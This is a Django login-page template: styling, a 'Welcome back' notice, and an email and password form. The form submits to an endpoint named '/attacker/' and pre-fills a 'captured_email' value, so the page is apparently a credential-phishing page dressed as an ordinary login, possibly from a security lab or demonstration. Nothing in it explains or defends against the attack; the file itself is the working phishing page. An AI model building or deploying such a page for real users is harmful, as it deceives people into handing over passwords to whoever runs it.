{% extends 'base.html' %}

{% block title %}Login{% endblock %}

{% block extra_css %}
<style>
    .login-container {
        max-width: 400px;
        margin: 0 auto;
    }
    
    .login-card {
        background: white;
        padding: 2rem;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }
    
    .login-card h2 {
        margin-bottom: 1.5rem;
        color: #333;
        text-align: center;
    }
    
    .form-group {
        margin-bottom: 1.5rem;
    }
    
    .form-group label {
        display: block;
        margin-bottom: 0.5rem;
        color: #555;
        font-weight: 500;
    }
    
    .form-group input {
        width: 100%;
        padding: 0.75rem;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 1rem;
        transition: border-color 0.3s;
    }
    
    .form-group input:focus {
        outline: none;
        border-color: #667eea;
    }
    
    .submit-btn {
        width: 100%;
        padding: 0.75rem;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        border-radius: 4px;
        font-size: 1rem;
        font-weight: 500;
        cursor: pointer;
        transition: opacity 0.3s;
    }
    
    .submit-btn:hover {
        opacity: 0.9;
    }

    .success-message {
        background-color: #d4edda;
        color: #155724;
        padding: 1rem;
        border-radius: 4px;
        margin-bottom: 1rem;
        border: 1px solid #c3e6cb;
        text-align: center;
        font-weight: bold;
    }
</style>
{% endblock %}

{% block content %}
<div class="login-container">
    <div class="login-card">
        <h2 style="color: black;">Login</h2>

        <div style="background:#fff3cd; color:#856404; padding:10px; border:1px solid #ffeaa7; margin-bottom:20px; border-radius:4px;">
            Welcome back! Please log in to continue.
        </div>


        <form method="post" action="/attacker/">
            {% csrf_token %}
            
            <div class="form-group">
                <label for="id_email">Email</label>
                <input type="email" 
                       name="email" 
                       id="id_email" 
                       required 
                       autofocus
                       value="{{ captured_email|default:'' }}">
            </div>
            
            <div class="form-group">
                <label for="id_password">Password</label>
                <input type="password" 
                       name="password" 
                       id="id_password" 
                       required>
            </div>
            
            <button type="submit" class="submit-btn">Login</button>
        </form>
    </div>
</div>
{% endblock %}
